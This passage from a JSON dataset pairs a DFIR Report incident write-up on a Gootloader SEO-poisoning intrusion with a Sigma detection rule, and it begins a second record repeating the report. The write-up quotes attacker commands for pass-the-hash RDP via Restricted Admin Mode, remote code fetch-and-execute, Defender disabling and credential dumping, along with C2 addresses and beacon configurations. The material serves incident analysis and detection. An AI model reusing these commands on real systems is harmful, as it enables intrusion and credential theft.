2\\advanced_ip_scanner.exe\" /portable \"C:\\Users\\████\\\" /lng en_us\n```\n\n## Lateral Movement\n\n```image\nAlt: Lateral Movement\nDescription: The image presents a flowchart titled 'Lateral Movement' that visually maps out the techniques used for lateral movement in a cybersecurity context. It details methods such as using Cobalt Strike, Remote Desktop Protocol (RDP), Windows Management Instrumentation (WMI), and PSExec. Each method is outlined with specific actions, including copying and executing Cobalt Strike, RDP usage through a Cobalt Strike proxy, executing commands via WMI, and commands executed to enable 'Restricted Admin Mode'. The layout is structured to provide a clear understanding of the relationships and processes involved in lateral movement during cyber intrusions.\nTranscription: |\n  Lateral Movement\n  \n  Cobalt Strike\n    \\\\COMPUTER\\ADMIN$\\2c075ae.exe\n    Cobalt Strike Copied to ADMIN$ and Executed via Service\n  \n  Remote Desktop Protocol\n    Remote Desktop via Cobalt Strike Proxy\n    RDP into Servers through a Cobalt Strike Beacon proxy from the beachhead\n  \n  WMI\n    Execute Commands on Remote Hosts via WMI\n    Commands Executed to Enable Restricted Admin Mode\n  \n  PSExec\n    Execute Commands on Remote Hosts via PSExec\n    Commands Executed to Enable Restricted Admin Mode\n```\n\nAs observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.\n\n```image\nAlt: Windows Services\nDescription: The image is a screenshot of a Windows Event Log, specifically showing details for Event ID 7045, which indicates that a service has been installed in the system. The log includes fields such as LogName, EventCode, ComputerName, Service File Name, Service Type, Start Type, and Service Account. The Service File Name contains a PowerShell command that has been obfuscated, hinting at malicious activity. This log entry is relevant for understanding the deployment of potentially harmful services in a cybersecurity context.\nTranscription: |\n  LogName=System\n  EventCode=7045\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-21-805815327-460989457-326783143-1113\n  SidType=0\n  SourceName=Microsoft-Windows-Service Control Manager\n  Type=Information\n  RecordNumber=1663\n  Keywords=Classic\n  TaskCategory=None\n  OpCode=The operation completed successfully.\n  Message=A service was installed in the system.\n  \n  Service Name:  a17bf34\n  Service File Name:  %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADAAtgB1AHcALQBPGAt1AGwAdAAgAEkATwAuAE0AZQBpAGUAaQB1AGYQBtACgB5AFMAwBuAHYAZQB0AG0AOAArBgAGAABgACgAEAwB1ADYANABTAHQAcQBpAG4AZGwA...\n```\n\nSMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.\n\n```image\nAlt: SMB Transfer\nDescription: The image is a tabular data representation showing network traffic details related to executable files involved in a cyber intrusion. It includes columns for source IP, source port, destination IP, destination port, number of packets, total data transmitted in bytes, and associated filenames (e.g., 6bb6ca2.exe, a4a375e.exe, 2c075ae.exe). The data appears to provide insights into the communication patterns and file transfers between systems during the lateral movement phase of an attack.\nTranscription: |\n  | Src IP / Country | Src Port | Dst IP / Country | Dst Port | Packets | Databytes / Bytes | Info                   |\n  | ---------------- | -------- | ---------------- | -------- | ------- | ----------------- | ---------------------- |\n  | 10.              | 57943    | 10.              | 445      | 874     | 827,446           | Filename > 6bbc6a2.exe |\n  |                  |          |                  |          |         | 874,666           |                        |\n  | 10.              | 61386    | 10.              | 445      | 892     | 829,032           | Filename > a4a375e.exe |\n  |                  |          |                  |          |         | 877,224           |                        |\n  | 10.              | 61745    | 10.              | 445      | 1,023   | 843,404           | Filename > 2c075ae.exe |\n  |                  |          |                  |          |         | 898,670           |                        |\n```\n\nThese executables were then executed by a remote service visible in the windows event id 7045 logs.\n\n```image\nAlt: Event Logs\nDescription: The image depicts a log entry that details the installation of a Windows service. It includes specific information such as the service name ('6bb6ca2'), service file name ('\\ADMINb6ca2.exe'), service type (user mode service), service start type (demand start), and service account (LocalSystem). This information is pertinent for analyzing potential malicious activity within a network, particularly related to the deployment of malware or unauthorized services.\nTranscription: |\n  \"A service was installed in the system.\n  \n  Service Name: 6bb6ca2\n  Service File Name: \\\\               \\ADMIN$\\6bb6ca2.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\nNext to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using “Restricted Admin Mode”.\n\nRestricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.\n\nThe threat actor attempted to use both Invoke-WMIExec and psexec to enable “Restricted Admin Mode”.\n\n```\npsexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n```\n\n```\npowershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:47961/'|%%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\<redacted>\\Invoke-WMIExec.ps1; Invoke-WMIExec -Target <redacted> -Domain <redacted> -Username <redacted> -Hash <redacted> -Command \"powershell.exe New-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD\" -verbose\"\n```\n\nThe logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set to the value “Yes” if the feature is used.\n\n```image\nAlt: Restricted Admin Mode\nDescription: The image displays a Windows Event Log entry for Event ID 4624, indicating a successful logon event. It contains detailed information such as the Logon Type, Security ID, Account Name, and notable mention of 'Restricted Admin Mode' being set to 'Yes'. This log entry is significant for tracking authentication methods used by threat actors and understanding their techniques, particularly in the context of lateral movement within a network.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=████████\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=31774\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID:        S-1-5-18\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3E7\n  \n  Logon Information:\n      Logon Type:         10\n      Restricted Admin Mode:    Yes\n      Virtual Account:    No\n      Elevated Token:     Yes\n  \n  Impersonation Level:    Impersonation\n  \n  New Logon:\n      Security ID:        ████████\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3798A24\n      Linked Logon ID:    0x0\n      Network Account Name:    -\n      Network Account Domain:  -\n      Logon GUID:         {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n      Process ID:         0x3fc\n      Process Name:       C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n      Workstation Name:   -\n      Source Network Address:  ████████\n      Source Port:        0\n  \n  Detailed Authentication Information:\n      Logon Process:      User32\n      Authentication Package:   Negotiate\n      Transited Services:   -\n      Package Name (NTLM only): -\n      Key Length:         0\n```\n\n## Collection\n\nThe threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.\n\n```image\nAlt: Document Access\nDescription: The image is a table displaying details of processes created during a cyber incident. It contains three columns: 'Action Type,' 'Initiating Process Command Line,' and 'Process Command Line.' The 'Action Type' indicates that 'ProcessCreated' occurred twice, both initiated by 'Explorer.EXE.' The 'Process Command Line' details that 'WORDPAD.EXE' was used to open two document files located in a specified directory, with the file paths partially redacted.\nTranscription: |\n  Action Type       Initiating Process Command Line   Process Command Line\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n```\n\nShellbags revealed attempts to enumerate multiple file shares containing information of interest to the threat actor.\n\n```image\nAlt: File Shares\nDescription: The image depicts a screenshot of a file directory structure, showing folders labeled 'IT,' 'Passwords,' and 'Contracts' under the 'Computers and Devices' section on a desktop interface. The screenshot includes icons representing directories and appears to display information related to file enumeration, which is relevant to the context of the threat actor's activities in accessing files during RDP sessions.\nTranscription: |\n  Value\n  Desktop\n    Computers and Devices\n      [Redacted]\n        IT\n          Passwords\n        Contracts\n        [Redacted]\n  \n  Drag a column header here to group by that column\n  \n  Value      Icon        Shell Type\n  [Redacted] No image    [Redacted]\n  Contracts  Directory   Directory\n  IT         Directory   Directory\n```\n\n## Command and Control\n\n### Gootloader\n\nGootloader second stage download URLs. These URLs were deobfuscated and extracted using this script by HP Threat Research. They’ve updated this script at least a few times now, thanks @hpsecurity and thanks to @GootLoaderSites for sharing on twitter as its broken/fixed.\n\n```\nhxxps://kakiosk.adsparkdev[.]com/test.php?hjkiofilihyl=\nhxxps://jp.imonitorsoft[.]com/test.php?hjkiofilihyl=\nhxxps://junk-bros[.]com/test.php?hjkiofilihyl=\n```\n\nDuring the intrusion, the Gootloader loader was observed communicating to 35.206.117.64:443 kakiosk[.]adsparkdev[.]com.\n\n```\nJa3:a0e9f5d64349fb13191bc781f81f42e1\nJa3s:567bb420d39046dbfd1f68b558d86382\nCertificate: [d8:85:d1:48:a2:99:f5:ee:9d:a4:3e:01:1c:b0:ec:12:e5:23:7d:61 ]\nNot Before: 2022/01/05 09:25:33 UTC\nNot After: 2022/04/05 09:25:32 UTC\nIssuer Org: Let's Encrypt\nSubject Common: kakiosk.adsparkdev.com [kakiosk.adsparkdev.com ,www.kakiosk.adsparkdev.com ]\nPublic Algorithm: rsaEncryption\n```\n\n### Cobalt Strike\n\n**146.70.78.43**\n\nCobalt Strike server TLS configuration:\n\n```\n146.70.78.43\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After: May 17 18:26:24 2025 GMT\nIssuer:  C=, ST=, L=, O=, OU=, CN=\nSubject:  C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/visit.js\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/fwlink\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\n**37.120.198.225**\n\nCobalt Strike server TLS configuration:\n\n```\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After : May 17 18:26:24 2025 GMT\nIssuer: C=, ST=, L=, O=, OU=, CN=\nSubject: C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/cm\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/ptj\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\nReal Intelligence Threat Analytics (RITA) was successful in locating one of the IP addresses used for Cobalt Strike command and control communications.\n\n```image\nAlt: RITA\nDescription: The image displays a data table generated by RITA (Real Intelligence Threat Analytics) showing network traffic statistics related to Cobalt Strike beacons. It includes columns for score, source IP, destination IP, number of connections, average bytes transferred, interval ranges, size ranges, and their respective modes and counts. The data provides insights into communication patterns with a specific Cobalt Strike server (146.70.78.43), indicating a total of 20,902 connections and an average of 3,883 bytes per connection. This information is critical for analyzing potential command and control activity.\nTranscription: |\n  plaintext\n  Time Generated: Sat, 02 Apr 2022 19:51:10 EDT\n  \n  Score   Source        Destination   Connections   Avg. Bytes   Intvl. Range   Size Range   Intvl. Mode   Size Mode   Intvl. Mode Count   Size Mode Count   Intvl. Skew   Size Skew   Intvl. Dispersion   Size Dispersion   Total Bytes\n  0.995   10.43.61.202  146.70.78.43  20902         3883.000     13780          2567         1             2181        14945               14285             0.000         0.000      0                   0                81180557\n```\n\nNetscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2 connections:\n\n```\nVolatility 3 Framework 2.0.0\n\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n...\n0x948431c46010  TCPv4   10.X.X.X    52670   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe   \n0x948431e19010  TCPv4   10.X.X.X   63723   146.70.78.43    443     CLOSED  3420    rundll32.exe    \n0x9484337f18a0  TCPv4   10.X.X.X    52697   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe    \n0x948435102050  TCPv4   10.X.X.X    52689   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe \n...\n```\n\n## Impact\n\nIn this case, there was no further impact to the environment before the threat actors were evicted.\n\n## Indicators\n\n### Network\n\n**Gootloader** \nhttps://kakiosk.adsparkdev[.]com \nhttps://jp.imonitorsoft[.]com \nhttps://junk-bros[.]com \n35.206.117.64:443\n\n**Cobalt Strike** \n146.70.78.43:443 \n37.120.198.225:443\n\n### File\n\n```\nolympus_plea_agreement 34603 .js\nd7d3e1c76d5e2fa9f7253c8ababd6349\n724013ea6906a3122698fd125f55546eac0c1fe0\n6e141779a4695a637682d64f7bc09973bb82cd24211b2020c8c1648cdb41001b\n\nolympus plea agreement(46196).zip\nb50333ff4e5cbcda8b88ce109e882eeb\n44589fc2a4d1379bee93282bbdb16acbaf762a45\n7d93b3531f5ab7ef8d68fb3d06f57e889143654de4ba661e5975dae9679bbb2c\n\nmi.ps1\nacef25c1f6a7da349e62b365c05ae60c\nc5d134a96ca4d33e96fb0ab68cf3139a95cf8071\nd00edf5b9a9a23d3f891afd51260b3356214655a73e1a361701cda161798ea0b\n\nInvoke-WMIExec.ps1\nb4626a335789e457ea48e56dfbf39710\n62a7656d81789591358796100390799e83428519\nc4939f6ad41d4f83b427db797aaca106b865b6356b1db3b7c63b995085457222\n\nls.exe\n87ae2a50ba94f45da39ec7673d71547c\ndfa0b4206abede8f441fcdc8155803b8967e035c\n8764131983eac23033c460833de5e439a4c475ad94cfd561d80cb62f86ff50a4\n```\n\n## Detections\n\n### Network\n\n```\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike\nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\n```\n\n### Sigma\n\nCustom Sigma rules:\n\n- Deleting Windows Defender scheduled tasks\n- Enabling restricted admin mode\n\nSigma repo rules:\n\n- Bloodhound Detection\n- Powershell download\n- Defender Disable via Powershell\n- Creation of Scheduled Task via Powershell\n- LaZagne LSASS Access\n- Systeminfo Discovery\n- CobaltStrike Named Pipe\n- Malicious PowerShell Commandlets\n- Suspicious Service Installation\n- Suspicious XOR Encoded PowerShell Command Line\n- Too Long PowerShell Commandlines\n- PowerShell Network Connections\n- Rundll32 Internet Connection\n- Mimikatz Use\n\n### Yara\n\nCustom Yara rule\n\n## MITRE\n\n- **T1189** Drive-by Compromise\n- **T1204.001** – User Execution: Malicious Link\n- **T1204.002** – User Execution: Malicious File\n- **T1059.001** – Command and Scripting Interpreter: PowerShell\n- **T1053** – Scheduled Task/Job\n- **T1218.011** – System Binary Proxy Execution: Rundll32\n- **T1555** – Credentials from Password Stores\n- **T1003.001** – OS Credential Dumping: LSASS Memory\n- **T1087** – Account Discovery\n- **T1560** – Archive Collected Data\n- **T1482** – Domain Trust Discovery\n- **T1615** – Group Policy Discovery\n- **T1069** – Permission Groups Discovery\n- **T1018** – Remote System Discovery\n- **T1033** – System Owner/User Discovery\n- **T1021.001** – Remote Services: Remote Desktop Protocol\n- **T1021.006** – Remote Services: Windows Remote Management\n- **T1005** – Data from Local System\n- **T1039** – Data from Network Shared Drive\n- **T1046** – Network Service Scanning\n- **T1562.001** – Impair Defenses: Disable or Modify Tools\n- **T1518.001** – Security Software Discovery\n- **T1071.001** Web Protocols\n- **T1027** – Obfuscated Files or Information",
    "sigma_rule": {
      "title": "PowerShell Base64 Encoded Reflective Assembly Load",
      "id": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
      "related": [
        {
          "id": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects base64 encoded .NET reflective loading of Assembly",
      "references": [
        "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "Christian Burkard (Nextron Systems), pH-T (Nextron Systems)",
      "date": "2022-03-01",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.defense-evasion",
        "attack.t1027",
        "attack.t1620"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA",
            "sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA",
            "bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA",
            "AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC",
            "BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp",
            "AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK",
            "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ",
            "sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA",
            "bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA",
            "WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA",
            "sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA",
            "bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_reflection_assembly_load.yml",
    "id": "327"
  },
  {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story\n\n**Categories:** \ncobaltstrike \ngootloader \nlazagne \npsexec\n\n**Published on:** \nMay 9, 2022\n\n---\n\nIn early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.\n\nThe intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents.\n\n## Background\n\nGootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to move compromised websites hosting malware to the top of certain search requests such as “what is the difference between a grand agreement and a contract?” or “freddie mac shared driveway agreement?”\n\nWhen the user searches for these phrases and clicks on one of the top results, they are left with a forum-looking web page where the user is instructed to download a file, which they accidentally execute (double click to open). You can learn more about Gootloader by reading these references: \n1. [“Gootloader” expands its payload delivery options](https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/)\n2. [Gootloader: ‘Initial Access as a Service’ Platform Expands Its Search for High Value Targets](https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/)\n3. [Gootloader](https://redcanary.com/threat-detection-report/threats/gootloader/)\n4. [Gootloader’s “mothership” controls malicious content](https://news.sophos.com/en-us/2021/08/12/gootloaders-mothership-controls-malicious-content/)\n\nThe researcher behind the @GootLoaderSites account is doing a great job of providing operational intelligence about the most recent malicious infrastructure. They also contact impacted businesses, monitor for newly created C2 addresses, and make the information public to the community. Thank you!\n\n```image\nAlt: Gootloader Infrastructure\nDescription: The image consists of a series of tweets from the account @GootLoaderSites, detailing current sites associated with the Gootloader malware. Each tweet mentions specific URLs that are serving malicious content, indicating the presence of malware on those sites. The tweets also express a willingness to assist affected parties in cleaning up their sites, highlighting ongoing monitoring and reporting efforts related to Gootloader's operations.\nTranscription: |\n  plaintext\n  GootLoader Sites @GootLoaderSites · Apr 16\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.jlfwealth.com/forum.php\n  \n  GootLoader Sites @GootLoaderSites · Apr 17\n  @JLFwealth FYI your site is delivering malware. Please let me know if you need help cleaning it up, DMs are open.\n  \n  GootLoader Sites @GootLoaderSites · Apr 15\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.joskel.nl/forum.php\n```\n\n## Case Summary\n\nThe intrusion started with a user searching Bing for “Olymplus Plea Agreement?”. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.\n\nFifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.\n\nAfter pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation. Meanwhile, on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.\n\nWith those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.\n\nThe threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.\n\nThe threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.\n\nOn the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case, such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline outlining the events of a cyber incident involving SEO poisoning and the Gootloader malware. It categorizes events by time and provides specific actions taken during the attack, such as 'Gootloader Execution,' 'Lateral Movement,' 'Mimikatz Execution,' and 'RDP Connections.' Each entry includes timestamps in UTC and descriptions of the executed commands, tools used, and affected systems. This structured format allows for easy tracking of the attack progression over two days.\nTranscription: |\n  plaintext\n  SEO Poisoning - A Gootloader Story\n  \n  Day 1\n  \n  14:43 UTC Gootloader Execution\n  - WScript.exe olympus.plex.agreement 34603.js\n  - kaiokok.adspardev.com 35.200.117.64:443\n  - Cobalt Strike loaded into memory\n  - 146.70.78.43:443\n  \n  15:00 UTC Lateral Movement from Beachhead Host to Workstation #1 and Disabling of Defender\n  - Via PowerShell Remote Service\n  - %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADA...\n  - powershell.exe -nop -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true\n  - 146.70.78.43:443\n  \n  15:34 UTC Antivirus Check on Beachhead Host\n  - WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n  \n  14:58 UTC Discovery via Bloodhound\n  - Invoke-BloodHound -CollectionMethod All\n  \n  15:30 UTC Second Cobalt Strike Server on Workstation #1\n  - 37.120.198.225:443\n  \n  15:44 UTC Mimikatz Execution on Beachhead Workstation\n  - Invoke-Mimikatz\n  \n  15:48 UTC LaZagne Execution on Workstation #1\n  - ls.exe all -oN --output C:\\Users\n  \n  16:05 UTC RDP into Workstation #1 from Beachhead Host\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\n  - Microsoft Defender Scheduled Tasks Deleted\n  - C:\\Windows\\system32\\schtasks.exe /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  \n  16:38 - 17:01 UTC Lateral Movement to Three Additional User 